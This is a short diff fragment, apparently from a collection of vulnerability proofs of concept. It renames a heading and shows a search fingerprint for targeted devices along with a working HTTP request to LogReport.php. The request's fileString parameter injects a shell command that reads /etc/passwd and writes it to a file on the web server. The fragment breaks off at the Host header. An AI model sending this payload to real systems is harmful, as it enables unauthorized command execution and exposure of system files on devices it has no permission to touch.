@@ -5,7 +5,7 @@
 body="Alarm" && body="白牌定制"
 ```
 
-## poc
+## POC
 ```
 GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;cat+/etc/passwd%3Echeck.txt HTTP/1.1
 Host: 
